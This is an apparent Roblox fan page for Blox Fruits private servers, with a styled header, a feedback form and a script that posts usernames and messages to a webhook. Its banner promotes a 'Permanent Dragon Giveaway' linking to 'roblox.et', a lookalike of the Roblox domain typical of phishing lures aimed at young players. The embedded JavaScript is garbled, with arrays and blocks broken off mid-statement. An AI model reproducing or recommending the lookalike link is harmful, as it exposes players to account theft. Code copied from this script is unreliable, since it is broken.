<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VOID SERVERS</title>
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(to right, #2e026d, #15162c);
            color: white;
            text-align: center;
            padding: 20px;
            overflow-x: hidden;
        }
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 30px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            box-shadow: 0 0 15px rgba(255, 255, 255, 0.1);
            animation: glow 2s infinite alternate;
        }
        @keyframes glow {
            from { box-shadow: 0 0 15px rgba(255, 255, 255, 0.1); }
            to { box-shadow: 0 0 30px rgba(255, 255, 255, 0.5); }
        }
        nav a {
            color: white;
            text-decoration: none;
            margin: 0 15px;
            font-weight: bold;
            transition: color 0.3s;
        }
        nav a:hover {
            color: #FFD700;
        }
        .advertisement {
            background: #FFD700;
            color: #000;
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            animation: slide 10s linear infinite;
        }
        @keyframes slide {
            0% { transform: translateX(100%); }
            100% { transform: translateX(-100%); }
        }
        .advertisement a {
            color: #000;
            font-weight: bold;
            text-decoration: none;
            padding: 5px 10px;
            background-color: #FFA500;
            border-radius: 5px;
            margin-left: 10px;
        }
        .advertisement a:hover {
            background-color: #FF8C00;
        }
        .server, .trading-server, .feedback-form {
            background: rgba(0, 0, 0, 0.7);
            padding: 20px;
            margin: 20px auto;
            width: 60%;
            border-radius: 15px;
            box-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
            border: 1px solid #6a0dad;
        }
        .button {
            background-color: #FFD700;
            color: #000;
            padding: 10px 20px;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            font-weight: bold;
            transition: background-color 0.3s;
        }
        .button:hover {
            background-color: #FFA500;
        }
        .fireflies {
            position: fixed;
            width: 100%;
            height: 100%;
            overflow: hidden;
            top: 0;
            left: 0;
            z-index: -1;
        }
        .firefly {
            position: absolute;
            width: 5px;
            height: 5px;
            background: #fff;
            border-radius: 50%;
            animation: fly 10s infinite ease-in-out;
        }
        @keyframes fly {
            0% { transform: translateY(0) translateX(0); opacity: 0.5; }
            50% { transform: translateY(-200px) translateX(200px); opacity: 1; }
            100% { transform: translateY(0) translateX(0); opacity: 0.5; }
        }
    </style>
</head>
<body>

    <!-- Fireflies Effect -->
    <div class="fireflies"></div>

    <!-- Advertisement Banner -->
    <div class="advertisement">
        üéâ BloxFruit Permanent Dragon Giveaway! üéâ
        <a href="https://www.roblox.et/games/2753915549/Blox-Fruits?privateServerLinkCode=59816836148209918793607839663756" target="_blank">Join!</a>
    </div>

    <!-- Header -->
    <header>
        <h1 style="color: #A020F0; animation: glow 2s infinite alternate;">GOLD SERVERS</h1>
        <nav>
            <a href="#">Home</a>
            <a href="#servers">Servers</a>
            <a href="#trading">Trading</a>
            <a href="#feedback">Feedback</a>
        </nav>
    </header>

    <main>
        <!-- Main Servers Section -->

            <form id="feedback-form">
                <input type="text" id="feedback-user" placeholder="Enter your Roblox username" required>
                <textarea id="feedback-message" placeholder="Your feedback..." required></textarea>
                <button type="submit" class="button">Submit Feedback</button>
            </form>
        </section>
    </main>

    <script>
        // List of Main Servers
        const servers = [
            {

        // List of Trading Servers
        const tradingServers = [
            {
                name: "Trading Server 1",

        // Render Main Servers
        const serverList = document.getElementById('servers');
        servers.forEach(server => {
            const section = document.createElement('section');
            section.className = 'server';
            section.innerHTML = `<h2>${server.name}</h2>

            serverList.appendChild(section);

        // Render Trading Servers
        const tradingList = document.getElementById('trading-list');
        tradingServers.forEach(server => {

                const payload = {
                    embeds: [{

                            { name: "üë§ Roblox Username", value: username, inline: true },
                            { name: "üí¨ Feedback", value: message }
                        ],
                        footer: { text: "VOID SERVERS Feedback" },

                    }]
                };

                fetch(webhookURL, {
                    method: 'POST',

                    body: JSON.stringify(payload)
                })
                .then(response => {

                        alert("‚úÖ Feedback submitted successfully! Thank you.");

                    } else {

</body>
</html>
